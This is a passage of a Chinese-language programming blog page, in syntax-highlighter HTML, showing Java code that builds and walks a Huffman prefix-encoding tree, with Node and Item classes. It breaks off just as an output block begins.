class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-33\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-34\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sb1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-35\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-36\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-37\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node </span><span class=\"crayon-e\">buildPrefixEncodeTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Node</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">freq</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">chs</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-38\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">PriorityQueue</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Node</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PriorityQueue</span><span class=\"crayon-o\">&lt;&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Comparator</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Node</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-39\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">compare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Node </span><span class=\"crayon-v\">o1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node </span><span class=\"crayon-v\">o2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-40\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">o1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">freq</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">o2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">freq</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">o1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">freq</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">o2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">freq</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-41\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-42\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-43\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-i\">Node</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-44\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">chs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-45\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Item</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">chs</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">freq</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-46\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">pQ</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-47\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-48\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-49\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-50\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-i\">Node</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pQ</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">poll</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pQ</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">poll</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-51\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-i\">Node</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">z</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Item</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'$'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">freq</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">freq</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-52\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">pQ</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">z</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-53\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-54\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pQ</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">poll</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-55\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-56\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-57\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-58\"><span class=\"crayon-c\">\t * tranversal  </span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-59\"><span class=\"crayon-c\">\t * @param root</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-60\"><span class=\"crayon-c\">\t * @param collector</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-61\"><span class=\"crayon-c\">\t * @param sb</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-62\"><span class=\"crayon-c\">\t */</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-63\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tranversalPrefixEncodeTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Node </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Map</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">collector</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">StringBuilder </span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-64\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// leaf node</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-65\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-66\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">collector</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-67\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-68\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-69\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">Node </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-70\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">tranversalPrefixEncodeTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">collector</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-71\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">length</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">length</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-72\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">tranversalPrefixEncodeTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">collector</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-73\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">length</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">length</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-74\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-75\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-76\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-77\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-78\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-79\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-80\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Item </span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-81\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-82\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Node </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Item </span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-83\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">super</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-84\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-85\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-86\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">item</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">item</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-87\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-88\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-89\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-90\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-91\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Item</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-92\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-93\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">freq</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-94\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-95\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Item</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">freq</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-96\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">super</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-97\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-98\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">freq</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">freq</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7ae869495167-99\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7ae869495167-100\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0174 seconds] -->\r\n<p>输出如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38743a7b4507849861\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 